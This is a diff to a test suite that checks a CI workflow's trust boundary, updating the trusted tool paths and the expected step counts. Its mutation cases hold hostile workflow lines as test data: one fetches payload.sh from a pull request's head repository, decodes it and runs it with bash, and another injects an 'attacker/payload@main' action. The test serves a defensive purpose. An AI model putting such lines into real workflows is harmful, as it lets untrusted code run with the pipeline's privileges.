@@ -63,17 +63,17 @@ describe("growth-guardrails workflow trust boundary", () => {
       "a dropped trusted tool invocation",
       (s: string) =>
         s.replace(
-          "node --experimental-strip-types tools/growth-guardrails/check-pr.mts",
+          "node --experimental-strip-types tools/growth-guardrails/test-conditionals.mts",
           "echo skip",
         ),
-      /must invoke the trusted tool: .*check-pr\.mts/,
+      /must invoke the trusted tool: .*test-conditionals\.mts/,
     ],
     [
       "a resurrected inline node heredoc",
       (s: string) =>
         s.replace(
-          "node --experimental-strip-types tools/growth-guardrails/check-pr.mts",
-          "node <<'NODE\n          console.log(1)\n          NODE",
+          "node --experimental-strip-types tools/growth-guardrails/test-size-budget.mts",
+          "node <<'NODE'\n          console.log(1)\n          NODE",
         ),
       /must match the approved shape/,
     ],
@@ -90,8 +90,8 @@ describe("growth-guardrails workflow trust boundary", () => {
       "an appended PR-head payload execution in a trusted step",
       (s: string) =>
         s.replace(
-          "node --experimental-strip-types tools/growth-guardrails/check-pr.mts",
-          'node --experimental-strip-types tools/growth-guardrails/check-pr.mts\n          gh api "/repos/${HEAD_REPO}/contents/payload.sh?ref=${HEAD_SHA}" --jq .content | base64 -d > "$RUNNER_TEMP/payload.sh"\n          bash "$RUNNER_TEMP/payload.sh"',
+          "node --experimental-strip-types tools/growth-guardrails/test-size-budget.mts",
+          'node --experimental-strip-types tools/growth-guardrails/test-size-budget.mts\n          gh api "/repos/${HEAD_REPO}/contents/payload.sh?ref=${HEAD_SHA}" --jq .content | base64 -d > "$RUNNER_TEMP/payload.sh"\n          bash "$RUNNER_TEMP/payload.sh"',
         ),
       /must match the approved shape/,
     ],
@@ -102,7 +102,7 @@ describe("growth-guardrails workflow trust boundary", () => {
           "      - name: Check out the trusted base revision",
           "      - name: Execute an untrusted action\n        uses: attacker/payload@main\n\n      - name: Check out the trusted base revision",
         ),
-      /must contain exactly 3 approved steps, not 4/,
+      /must contain exactly 6 approved steps, not 7/,
     ],
     [
       "a non-approved shell field",
